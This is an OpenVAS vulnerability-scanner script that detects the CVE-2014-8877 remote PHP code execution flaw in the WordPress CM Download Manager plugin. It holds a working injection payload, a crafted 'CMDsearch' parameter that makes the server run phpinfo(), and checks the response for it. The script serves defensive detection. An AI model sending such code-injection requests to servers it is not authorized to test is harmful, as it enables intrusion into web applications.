###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_71204.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress CM Download Manager Plugin Remote PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105120");
  script_bugtraq_id(71204);
  script_cve_id("CVE-2014-8877");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("WordPress CM Download Manager Plugin Remote PHP Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71204");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary PHP code
within the context of the web server. This may lead to a full compromise of the affected application
or aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");
  script_tag(name:"insight", value:"The application fails to properly validate user-supplied input");
  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"The CM Download Manager for WordPress is prone to remote PHP-code
execution vulnerability");

  script_tag(name:"affected", value:"CM Download Manager 2.0.0 and prior are vulnerable.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-21 10:16:00 +0100 (Fri, 21 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/cmdownloads/?CMDsearch=".phpinfo()."';

if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) )
{
    security_message( port:port );
    exit(0);
}

exit(0);

